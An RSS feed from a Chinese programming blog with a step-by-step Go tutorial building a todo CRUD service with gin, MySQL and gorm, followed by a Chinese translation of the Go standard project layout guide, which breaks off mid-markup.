<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0"
  xmlns:atom="http://www.w3.org/2005/Atom"
  xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>绝剑阁</title>
    <link>https://cjliblog.top/</link>
    
    <image>
      <url>https://www.gravatar.com/avatar/9a30667a06f9e54b4502c81e69456aa3</url>
      <title>绝剑阁</title>
      <link>https://cjliblog.top/</link>
    </image>
    
    <atom:link href="https://cjliblog.top/rss2.xml" rel="self" type="application/rss+xml"/>
    
    <description>银屏之下，龙游四海。</description>
    <pubDate>Wed, 13 Dec 2023 12:55:08 GMT</pubDate>
    <generator>http://hexo.io/</generator>
    
    <item>
      <title>基于go+gin+gorm+mysql实现的CRUD项目（更新ing）</title>
      <link>https://cjliblog.top/2023/12/13/go/</link>
      <guid>https://cjliblog.top/2023/12/13/go/</guid>
      <pubDate>Tue, 12 Dec 2023 16:00:00 GMT</pubDate>
      
      <description>大家好，我是description</description>
      
      
      
      <content:encoded><![CDATA[<p><br>开个坑，写个项目。</p><h1 id="Leaning-doc-📝"><a href="#Leaning-doc-📝" class="headerlink" title="Leaning doc 📝"></a>Leaning doc 📝</h1><h2 id="初始化"><a href="#初始化" class="headerlink" title="初始化"></a>初始化</h2><br>首先我们创建初始化项目<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">go mod init hello</span><br></pre></td></tr></table></figure><br>这里的hello可以替换成任何喜欢的模块名的。<br>然后创建main.go<br><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line">&lt;/br&gt;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">&lt;/br&gt;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>一般来说不要先想着导入库，goland会自动优化掉的。同理，如果用到了外部库，编译器会第一时间把包导入。<br><br><br><br><br>这时第一时间想到<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">fmt.Println(&quot;Hello, World!&quot;)</span><br></pre></td></tr></table></figure><br>但是会发现输入print的话，会跳出很多函数，引起了我的好奇心。<br>我列出几个看到第一眼就感觉比较常见的。<br><br><br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">print(&quot;Hello, World!&quot;)</span><br></pre></td></tr></table></figure><br>内置的打印函数<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">println(&quot;Hello, World!&quot;)</span><br></pre></td></tr></table></figure><br>打印后换行<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">fmt.Println(&quot;Hello, World!&quot;)</span><br></pre></td></tr></table></figure><br>属于fmt包，最常用，因为可以处理多种类型的参数，功能比较强大。<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">fmt.Printf(&quot;%s&quot;, &quot;Hello, World!&quot;)</span><br></pre></td></tr></table></figure><br>格式化输出，类似于C语言中的打印函数<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">log.Printf(&quot;Hello, World!&quot;)</span><br></pre></td></tr></table></figure><br>属于log包，打印的同时，前面会带上时间戳<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pretty.Print(&quot;Hello, World!&quot;)</span><br></pre></td></tr></table></figure><br>美化输出对象，尤其对于复杂数据结构如结构体或切片。<br><br><br>接下来，我们需要解决todos的逻辑，因此创建funcs文件夹，在里面创建todos.go文件。<h2 id="设计crud中的“c“"><a href="#设计crud中的“c“" class="headerlink" title="设计crud中的“c“"></a>设计crud中的“c“</h2><br>首先我们可以先尝试做一个“增”功能。<br><br><br>设计数据结构，<br><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> TODO <span class="keyword">struct</span> &#123;</span><br><span class="line">Id      <span class="type">int</span>    <span class="string">`json:&quot;id&quot;`</span></span><br><span class="line">Content <span class="type">string</span> <span class="string">`json:&quot;content&quot;`</span></span><br><span class="line">Done    <span class="type">bool</span>   <span class="string">`json:&quot;done&quot;`</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>这里一个简单的todolist，我们需要三个成员：<br>1.id。用于标识每一条消息是独一无二的。<br>2.content。内容，一般是一串文字，所以是字符串。<br>3.done。标识是否完成，那就是二元的状态，因此用bool类型。当然，也可以用int的，看心情。<br><br><br>每一个成员有一个标签，用于JSON包的便捷操作。<br>注意，结构体的名字是要大写的，在这里四个字母都大写，所以表现不明显。而类型名在go中都是后置的，在这里的表现为struct后置。<br>结构体里成员的名字并没有规则要求。但是此处，我们后边用JSON包处理它，因此我们要大写公开。<h2 id="gin框架的基本使用"><a href="#gin框架的基本使用" class="headerlink" title="gin框架的基本使用"></a>gin框架的基本使用</h2><br>接下来创建一个函数<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">func TodoService(r *gin.RouterGroup, db *sql.DB) &#123;</span><br><span class="line">&lt;/br&gt;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>函数名的话开头大写，这样代表public，而其他方法如添加todo的函数，我们开头小写，代表private，然后通过这个TodoService进行调用，对外开放。<br>为什么使用指针呢？<br>对于routergroup，是因为这样可以保证用的框架的一致性，并且不需要反复复制这个框架，造成资源浪费。<br>对于DB，是因为我们链接数据库，就是要改值的。<br><br><br>在导入包后，我们可以进去看看routergroup.go<br>我的路径如下：<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">myGo\mypath\pkg\mod\github.com\gin-gonic\gin@v1.9.1</span><br></pre></td></tr></table></figure><br><br><br>我么看到这个函数<br><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// POST is a shortcut for router.Handle(&quot;POST&quot;, path, handlers).</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(group *RouterGroup)</span></span> POST(relativePath <span class="type">string</span>, handlers ...HandlerFunc) IRoutes &#123;</span><br><span class="line"><span class="keyword">return</span> group.handle(http.MethodPost, relativePath, handlers)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>它是一个RouterGroup类的方法，输入为一个相对路径和任意数量的HandlerFunc。返回一个 `IRoutes` 类型的对象。在 Gin 中，`IRoutes` 是一个接口，提供了链式路由的能力。那么如果不需要链式路由，我们是可以忽略这个返回值的。<br><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// HandlerFunc defines the handler used by gin middleware as return value.</span></span><br><span class="line"><span class="keyword">type</span> HandlerFunc <span class="function"><span class="keyword">func</span><span class="params">(*Context)</span></span></span><br></pre></td></tr></table></figure><br>`gin.Context` 是 Gin 框架中的一个核心结构体。它封装了一个 HTTP 请求的所有细节，并提供了许多方法来操作 HTTP 请求和响应。<br><br><br><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 增加todo</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">addTodo</span><span class="params">(r *gin.RouterGroup, db sql.DB)</span></span> &#123;</span><br><span class="line">r.POST(<span class="string">&quot;/todo&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">&lt;/br&gt;</span><br><span class="line">&#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>写下如上代码，创建了一个路由，处理器是一个匿名函数。匿名函数没有名字，一般一次性的，但是很方便。<br><br><br>完善后：<br><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 增加todo</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">addTodo</span><span class="params">(r *gin.RouterGroup, db *sql.DB)</span></span> &#123;</span><br><span class="line">r.POST(<span class="string">&quot;/todo&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line"><span class="keyword">var</span> todo TODO</span><br><span class="line">c.BindJSON(&amp;todo)</span><br><span class="line">        db.Exec(<span class="string">&quot;insert into todos(content,done) values(?,?)&quot;</span>, todo.Content, todo.Done)</span><br><span class="line">c.JSON(<span class="number">200</span>, gin.H&#123;<span class="string">&quot;status&quot;</span>: <span class="string">&quot;OK&quot;</span>&#125;)</span><br><span class="line">&#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>这里先把json绑定到结构体实例，再执行数据写入数据库，返回成功状态。<br>此处解释一下<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">type H map[string]any</span><br></pre></td></tr></table></figure><br>`map[string]any`：这是定义 `H` 类型实际表示的数据结构。`map` 是 Go 语言中的一种内置数据类型，它是一个键值对的集合。这里：<br>- `string` 表示键的类型，即这个映射的每个键都是一个字符串。- `any` 表示值的类型，这是 Go 1.18 引入的一个新特性，代表任意类型的值。`any` 实际上是 `interface{}` 的一个别名，意味着可以存储任何类型的值。<br>加上错误处理的完善后：<br><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 增加todo</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">addTodo</span><span class="params">(r *gin.RouterGroup, db *sql.DB)</span></span> &#123;</span><br><span class="line">r.POST(<span class="string">&quot;/todo&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line"><span class="keyword">var</span> todo TODO</span><br><span class="line">&lt;/br&gt;</span><br><span class="line"><span class="keyword">if</span> err := c.BindJSON(&amp;todo); err != <span class="literal">nil</span> &#123;</span><br><span class="line">fmt.Println(<span class="string">&quot;Error:&quot;</span>, err)</span><br><span class="line">c.JSON(<span class="number">400</span>, gin.H&#123;</span><br><span class="line"><span class="string">&quot;status&quot;</span>: <span class="string">&quot;BadRequest&quot;</span>, <span class="string">&quot;error&quot;</span>: err.Error(),</span><br><span class="line">&#125;)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">&lt;/br&gt;</span><br><span class="line">_, err := db.Exec(<span class="string">&quot;insert into todos(content,done) values(?,?)&quot;</span>, todo.Content, todo.Done)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">c.JSON(<span class="number">500</span>, gin.H&#123;<span class="string">&quot;status&quot;</span>: <span class="string">&quot;InternalServerError&quot;</span>&#125;)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">c.JSON(<span class="number">200</span>, gin.H&#123;<span class="string">&quot;status&quot;</span>: <span class="string">&quot;OK&quot;</span>&#125;)</span><br><span class="line">&#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>更改主函数<br><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">TodoService</span><span class="params">(r *gin.RouterGroup, db *sql.DB)</span></span> &#123;</span><br><span class="line">addTodo(r,db)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>回到main.go，进行如下建议配置：<br><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line">&lt;/br&gt;</span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;database/sql&quot;</span></span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="string">&quot;github.com/gin-gonic/gin&quot;</span></span><br><span class="line">_ <span class="string">&quot;github.com/go-sql-driver/mysql&quot;</span></span><br><span class="line"><span class="string">&quot;hello/funcs&quot;</span></span><br><span class="line"><span class="string">&quot;log&quot;</span></span><br><span class="line">)</span><br><span class="line">&lt;/br&gt;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">initDB</span><span class="params">()</span></span> (db *sql.DB, err <span class="type">error</span>) &#123;</span><br><span class="line">db, err = sql.Open(<span class="string">&quot;mysql&quot;</span>, <span class="string">&quot;root:1234@tcp(127.0.0.1:3306)/tododb&quot;</span>)</span><br><span class="line">&lt;/br&gt;</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Fatalf(<span class="string">&quot;Error opening database: %q&quot;</span>, err)</span><br><span class="line"><span class="comment">//%q代表带引号的字符串</span></span><br><span class="line"><span class="comment">//log.Fatalf 是一个便捷的函数，用于打印错误信息并结束程序。</span></span><br><span class="line"><span class="comment">//它的行为类似于先调用 log.Printf 打印信息，</span></span><br><span class="line"><span class="comment">//然后调用 os.Exit(1) 来终止程序。</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> db, err</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="comment">//var db *sql.DB</span></span><br><span class="line">db, err := initDB()</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Fatalf(<span class="string">&quot;Error initializing database:%q&quot;</span>, err)</span><br><span class="line">&#125;</span><br><span class="line">&lt;/br&gt;</span><br><span class="line"><span class="keyword">defer</span> db.Close()</span><br><span class="line">r := gin.Default()</span><br><span class="line">&lt;/br&gt;</span><br><span class="line">funcs.TodoService(r, db)</span><br><span class="line">&lt;/br&gt;</span><br><span class="line">fmt.Println(<span class="string">&quot;Starting sever at http://localhost:8080&quot;</span>)</span><br><span class="line">&lt;/br&gt;</span><br><span class="line">r.Run(<span class="string">&quot;:8080&quot;</span>)</span><br><span class="line">&lt;/br&gt;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/br&gt;</span><br></pre></td></tr></table></figure><br>post方法发送json<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&quot;content&quot;:&quot;1&quot;,&quot;done&quot;:true&#125;</span><br></pre></td></tr></table></figure><br>到<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://localhost:8080/todo</span><br></pre></td></tr></table></figure><br>返回<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;status&quot;: &quot;OK&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>当然，我们也可以测试其他的错误情况，会返回不同的json，可以加深对它的理解。<br><br><br>注意几点：<br>`r := gin.Default()`<br>- 这行代码创建了一个 Gin 框架的默认路由器。`gin.Default()` 返回一个新的 `gin.Engine` 实例，它包含了 Gin 的默认中间件（例如日志和恢复）。<br>如果遇到`Error opening database: "sql: unknown driver "mysql" (forgotten import?)"`，问题看起来是 Go 语言的 `database/sql` 包无法识别 "mysql" 数据库驱动。这通常发生在尚未导入相应的 MySQL 驱动包的情况下。<br>在 Go 中，使用数据库通常涉及两个步骤：<br>1. **导入 `database/sql` 包**：这是 Go 标准库的一部分，提供了与数据库交互的通用接口。2. **导入特定数据库的驱动包**：例如，对于 MySQL，你通常会使用 `github.com/go-sql-driver/mysql`。<br>解决这个问题的方法是导入相应的 MySQL 驱动包。在你的 Go 文件的开头，添加以下导入语句：<br><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;database/sql&quot;</span></span><br><span class="line">    _ <span class="string">&quot;github.com/go-sql-driver/mysql&quot;</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure><br>请注意 `_` 符号的使用。这被称为**匿名导入**，在 Go 中用于导入一个包仅为了确保其初始化过程被执行，而不直接使用该包中的任何函数或方法。在这种情况下，它用于确保 MySQL 驱动注册到了 `database/sql`。<br>导入后，你的 `database/sql` 包就能够识别 "mysql" 作为数据库驱动了，应该能够解决你的问题。<br>如果你还没安装 `github.com/go-sql-driver/mysql`，你需要先通过命令 `go get -u github.com/go-sql-driver/mysql` 来安装它。<h2 id="grom的导入"><a href="#grom的导入" class="headerlink" title="grom的导入"></a>grom的导入</h2><br>我们导入gorm，一种与数据库交互的框架：<br><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line">&lt;/br&gt;</span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;fmt&quot;</span></span><br><span class="line">    <span class="string">&quot;github.com/gin-gonic/gin&quot;</span></span><br><span class="line">    <span class="string">&quot;gorm.io/driver/mysql&quot;</span></span><br><span class="line">    <span class="string">&quot;gorm.io/gorm&quot;</span></span><br><span class="line">    <span class="string">&quot;hello/funcs&quot;</span></span><br><span class="line">    <span class="string">&quot;log&quot;</span></span><br><span class="line">)</span><br><span class="line">&lt;/br&gt;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">initDB</span><span class="params">()</span></span> (db *gorm.DB, err <span class="type">error</span>) &#123;</span><br><span class="line">    dsn := <span class="string">&quot;root:1234@tcp(127.0.0.1:3306)/tododb?charset=utf8mb4&amp;parseTime=True&amp;loc=Local&quot;</span></span><br><span class="line">    db, err = gorm.Open(mysql.Open(dsn), &amp;gorm.Config&#123;&#125;)</span><br><span class="line">&lt;/br&gt;</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">       log.Fatalf(<span class="string">&quot;Error opening database: %q&quot;</span>, err)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> db, err</span><br><span class="line">&#125;</span><br><span class="line">&lt;/br&gt;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    db, err := initDB()</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">       log.Fatalf(<span class="string">&quot;Error initializing database: %q&quot;</span>, err)</span><br><span class="line">    &#125;</span><br><span class="line">&lt;/br&gt;</span><br><span class="line">    sqlDB, err := db.DB()</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">       log.Fatalf(<span class="string">&quot;Error getting generic database object: %q&quot;</span>, err)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">defer</span> sqlDB.Close()</span><br><span class="line">&lt;/br&gt;</span><br><span class="line">    r := gin.Default()</span><br><span class="line">&lt;/br&gt;</span><br><span class="line">    funcs.TodoService(r, db) <span class="comment">// 确保 funcs.TodoService 函数可以处理 *gorm.DB 类型的参数</span></span><br><span class="line">&lt;/br&gt;</span><br><span class="line">    fmt.Println(<span class="string">&quot;Starting server at http://localhost:8080&quot;</span>)</span><br><span class="line">&lt;/br&gt;</span><br><span class="line">    r.Run(<span class="string">&quot;:8080&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>解释一下这一句：<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;root:1234@tcp(127.0.0.1:3306)/tododb?charset=utf8mb4&amp;parseTime=True&amp;loc=Local&quot;</span><br></pre></td></tr></table></figure><br>从前往后：数据库的用户名，密码，地址，数据库名，字符编码标准（utf8mb4还包括emoji），gotime与mysql时间保持一致，设置时区为本地。]]></content:encoded>
      
      
      <category domain="https://cjliblog.top/categories/go/">go</category>
      
      
      
      <comments>https://cjliblog.top/2023/12/13/go/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>Go项目标准布局</title>
      <link>https://cjliblog.top/2023/12/13/GO%E8%AF%AD%E8%A8%80%E5%B8%83%E5%B1%80-%E4%B8%AD%E6%96%87%E7%89%88/</link>
      <guid>https://cjliblog.top/2023/12/13/GO%E8%AF%AD%E8%A8%80%E5%B8%83%E5%B1%80-%E4%B8%AD%E6%96%87%E7%89%88/</guid>
      <pubDate>Tue, 12 Dec 2023 16:00:00 GMT</pubDate>
      
      <description>大家好，我是description</description>
      
      
      
      <content:encoded><![CDATA[<h1 id="Go项目标准布局"><a href="#Go项目标准布局" class="headerlink" title="Go项目标准布局"></a>Go项目标准布局</h1><ul><li><a href="README.md">English</a></li><li><a href="README_ko.md">한국어 문서</a></li><li><a href="README_zh.md">简体中文</a></li><li><a href="README_zh-TW.md">正體中文</a></li><li><a href="README_zh-CN.md">简体中文</a> - ???</li><li><a href="README_fr.md">Français</a></li><li><a href="README_ja.md">日本語</a></li><li><a href="README_ptBR.md">Portuguese</a></li><li><a href="README_es.md">Español</a></li><li><a href="README_ro.md">Română</a></li><li><a href="README_ru.md">Русский</a></li><li><a href="README_tr.md">Türkçe</a></li><li><a href="README_it.md">Italiano</a></li><li><a href="README_vi.md">Vietnamese</a></li><li><a href="README_ua.md">Українська</a></li><li><a href="README_id.md">Indonesian</a></li></ul><p>这是Go应用程序项目的基础布局。这不是Go核心开发团队定义的官方标准；无论是在经典项目还是在新兴的项目中，这都是Go生态系统中一组常见的项目布局模式。这其中有一些模式比另外的一些更受欢迎。它通过几个支撑目录为任何足够大规模的实际应用程序提供一些增强功能。</p><p>如果你正准备学习Go、正在构建PoC项目或编写玩具项目，那么按照这个项目进行布局就大材小用了。从一些真正简单的事情开始（一个<code>main.go</code>文件就足够了）。随着项目的增长，确保代码结构的合理是非常重要的，否则最终会出现很多隐藏的依赖关系和全局状态而导致这个项目的代码混乱。当一个项目多人同时进行时，就更需要有清晰的结构，此时引入一种通用的项目包&#x2F;标准库管理工具就显得尤为重要。当你维护一个开源项目或者有其他项目导入了你的代码，那么有一个私有的包（如<code>internal</code>）就很重要了。克隆这个项目，保留你项目中需要的部分，并删除其他部分。通常来说不需要也没必要使用这个项目中的全部内容。因为，从来没有在一个单一的项目中使用本项目中定义的全部模式，甚至如<code>vendor</code>模式。</p><p>Go 1.14 <code>Go Modules</code>已经可以用于生产环境。没有什么特殊原因的话，请使用<code>Go Modules</code>，使用它之后，你就再也不用担心<code>$GOPATH</code>的配置和项目实际的存放位置，项目想放在哪里就放在哪里。本项目中<code>go.mod</code>文件的内容假设你的项目是托管在GitHub上的，当然这不是必选项，因为<code>Module</code>中的路径可以是任意的值，一般<code>Module</code>路径的第一部分中应该包含一个点（最新版的Go中不再强制要求这一点，如果使用的是稍微旧一些的版本，那么可能遇到编译失败的问题）。了解更多请看Issues <a href="https://github.com/golang/go/issues/37554">37554</a>和 <a href="https://github.com/golang/go/issues/32819">32819</a>。</p><p>本项目布局有意设计的更通用一些，而不会尝试去引入一些特定的Go包结构。</p><p>这是社区共同的努力。如果发现了一种新的模式或者项目中已经存在的某些模式需要更新，请新建一个issue。</p><p>如果需要一些关于命名、格式化或者样式方面的帮助，请先运行<a href="https://golang.org/cmd/gofmt/"><code>gofmt</code></a>和<a href="https://github.com/golang/lint"><code>golint</code></a>。另外，请务必阅读以下Go代码样式指南和建议：</p><ul><li><p><a href="https://talks.golang.org/2014/names.slide">https://talks.golang.org/2014/names.slide</a></p></li><li><p><a href="https://golang.org/doc/effective_go.html#names">https://golang.org/doc/effective_go.html#names</a></p></li><li><p><a href="https://blog.golang.org/package-names">https://blog.golang.org/package-names</a></p></li><li><p><a href="https://github.com/golang/go/wiki/CodeReviewComments">https://github.com/golang/go/wiki/CodeReviewComments</a></p></li><li><p>Style guideline for Go packages (rakyll&#x2F;JBD)</p></li></ul><p>更多背景信息请查看<a href="https://medium.com/golang-learn/go-project-layout-e5213cdcfaa2"><code>Go Project Layout</code></a>。</p><p>有关命名和项目包组织样式以及其他代码结构的更多推荐文章：</p><ul><li><a href="https://www.youtube.com/watch?v=PTE4VJIdHPg">GopherCon EU 2018: Peter Bourgon - Best Practices for Industrial Programming</a></li><li><a href="https://www.youtube.com/watch?v=MzTcsI6tn-0">GopherCon Russia 2018: Ashley McNamara + Brian Ketelsen - Go best practices</a></li><li><a href="https://www.youtube.com/watch?v=ltqV6pDKZD8">GopherCon 2017: Edward Muller - Go Anti-Patterns</a></li><li><a href="https://www.youtube.com/watch?v=oL6JBUk6tj0">GopherCon 2018: Kat Zien - How Do You Structure Your Go Apps</a></li></ul><h2 id="Go目录"><a href="#Go目录" class="headerlink" title="Go目录"></a>Go目录</h2><h3 id="cmd"><a href="#cmd" class="headerlink" title="/cmd"></a><code>/cmd</code></h3><p>项目主要的应用程序。</p><p>对于每个应用程序来说这个目录的名字应该和项目可执行文件的名字相匹配（例如，<code>/cmd/myapp</code>）。</p><p>不要在这个目录中放太多的代码。如果目录中的代码可以被其他项目导入并使用，那么应该把他们放在<code>/pkg</code>目录。如果目录中的代码不可重用，或者不希望被他人使用，应该将代码放在<code>/internal</code>目录。显式地表明意图比较好！</p><p>通常来说，项目都应该拥有一个小的<code>main</code>函数，并在<code>main</code>函数中导入或者调用<code>/internal</code>和<code>/pkg</code>目录中的代码。</p><p>更多详情，请看<a href="https://github.com/golang-standards/project-layout/blob/master/cmd/README.md"><code>/cmd</code></a>目录中的例子。</p><h3 id="internal"><a href="#internal" class="headerlink" title="/internal"></a><code>/internal</code></h3><p>私有的应用程序代码库。这些是不希望被其他人导入的代码。请注意：这种模式是Go编译器强制执行的。详细内容情况Go 1.4的<a href="https://golang.org/doc/go1.4#internalpackages">release notes</a>。再次注意，在项目的目录树中的任意位置都可以有<code>internal</code>目录，而不仅仅是在顶级目录中。</p><p>可以在内部代码包中添加一些额外的结构，来分隔共享和非共享的内部代码。这不是必选项（尤其是在小项目中），但是有一个直观的包用途是很棒的。应用程序实际的代码可以放在<code>/internal/app</code>目录（如，<code>internal/app/myapp</code>），而应用程序的共享代码放在<code>/internal/pkg</code>目录（如，<code>internal/pkg/myprivlib</code>）中。</p><h3 id="pkg"><a href="#pkg" class="headerlink" title="/pkg"></a><code>/pkg</code></h3><p>外部应用程序可以使用的库代码（如，<code>/pkg/mypubliclib</code>）。其他项目将会导入这些库来保证项目可以正常运行，所以在将代码放在这里前，一定要三思而行。请注意，<code>internal</code>目录是一个更好的选择来确保项目私有代码不会被其他人导入，因为这是Go强制执行的。使用<code>/pkg</code>目录来明确表示代码可以被其他人安全的导入仍然是一个好方式。Travis Jeffery撰写的关于 <a href="https://travisjeffery.com/b/2019/11/i-ll-take-pkg-over-internal/">I’ll take pkg over internal</a> 文章很好地概述了<code>pkg</code>和<code>inernal</code>目录以及何时使用它们。</p><p>当您的根目录包含大量非Go组件和目录时，这也是一种将Go代码分组到一个位置的方法，从而使运行各种Go工具更加容易（在如下的文章中都有提到：2018年GopherCon <a href="https://www.youtube.com/watch?v=PTE4VJIdHPg">Best Practices for Industrial Programming</a>，<a href="https://www.youtube.com/watch?v=oL6JBUk6tj0">Kat Zien - How Do You Structure Your Go Apps</a> ，Golab 2018 <a href="https://www.youtube.com/watch?v=3gQa1LWwuzk">Massimiliano Pippi - Project layout patterns in Go</a>）。</p><p>点击查看<code>/pkg</code>就能看到那些使用这个布局模式的流行Go代码仓库。这是一种常见的布局模式，但未被普遍接受，并且Go社区中的某些人不推荐这样做。</p><p>如果项目确实很小并且嵌套的层次并不会带来多少价值（除非你就是想用它），那么就不要使用它。请仔细思考这种情况，当项目变得很大，并且根目录中包含的内容相当繁杂（尤其是有很多非Go的组件）。</p><h3 id="vendor"><a href="#vendor" class="headerlink" title="/vendor"></a><code>/vendor</code></h3><p>应用程序的依赖关系（通过手动或者使用喜欢的依赖管理工具，如新增的内置<a href="https://github.com/golang/go/wiki/Modules">Go Modules</a>特性）。执行<code>go mod vendor</code>命令将会在项目中创建<code>/vendor</code>目录，注意，如果使用的不是Go 1.14版本，在执行<code>go build</code>进行编译时，需要添加<code>-mod=vendor</code>命令行选项，因为它不是默认选项。</p><p>构建库文件时，不要提交应用程序依赖项。</p><p>请注意，从<a href="https://golang.org/doc/go1.13#modules">1.13</a>开始，Go也启动了模块代理特性（使用<code>https：//proxy.golang.org</code>作为默认的模块代理服务器）。点击<a href="https://blog.golang.org/module-mirror-launch">这里</a>阅读有关它的更多信息，来了解它是否符合所需要求和约束。如果<code>Go Module</code>满足需要，那么就不需要<code>vendor</code>目录。</p><h2 id="服务端应用程序的目录"><a href="#服务端应用程序的目录" class="headerlink" title="服务端应用程序的目录"></a>服务端应用程序的目录</h2><h3 id="api"><a href="#api" class="headerlink" title="/api"></a><code>/api</code></h3><p>OpenAPI&#x2F;Swagger规范，JSON模式文件，协议定义文件。</p><p>更多样例查看<a href="https://github.com/golang-standards/project-layout/blob/master/api/README.md"><code>/api</code></a>目录。</p><h2 id="Web应用程序的目录"><a href="#Web应用程序的目录" class="headerlink" title="Web应用程序的目录"></a>Web应用程序的目录</h2><h3 id="web"><a href="#web" class="headerlink" title="/web"></a><code>/web</code></h3><p>Web应用程序特定的组件：静态Web资源，服务器端模板和单页应用（Single-Page App，SPA）。</p><h2 id="通用应用程序的目录"><a href="#通用应用程序的目录" class="headerlink" title="通用应用程序的目录"></a>通用应用程序的目录</h2><h3 id="configs"><a href="#configs" class="headerlink" title="/configs"></a><code>/configs</code></h3><p>配置文件模板或默认配置。</p><p>将<code>confd</code>或者<code>consul-template</code>文件放在这里。</p><h3 id="init"><a href="#init" class="headerlink" title="/init"></a><code>/init</code></h3><p>系统初始化（systemd、upstart、sysv）和进程管理（runit、supervisord）配置。</p><h3 id="scripts"><a href="#scripts" class="headerlink" title="/scripts"></a><code>/scripts</code></h3><p>用于执行各种构建，安装，分析等操作的脚本。</p><p>这些脚本使根级别的Makefile变得更小更简单（例如<a href="https://github.com/hashicorp/terraform/blob/main/Makefile">https://github.com/hashicorp/terraform/blob/main/Makefile</a>）。</p><p>更多样例查看<a href="https://github.com/golang-standards/project-layout/blob/master/scripts/README.md"><code>/scripts</code></a>。</p><h3 id="build"><a href="#build" class="headerlink" title="/build"></a><code>/build</code></h3><p>打包和持续集成。</p><p>将云（AMI），容器（Docker），操作系统（deb，rpm，pkg）软件包配置和脚本放在<code>/build/package</code>目录中。</p><p>将CI（travis、circle、drone）配置文件和就脚本放在<code>build/ci</code>目录中。请注意，有一些CI工具（如，travis CI）对于配置文件的位置有严格的要求。尝试将配置文件放在<code>/build/ci</code>目录，然后链接到CI工具想要的位置。</p><h3 id="deployments"><a href="#deployments" class="headerlink" 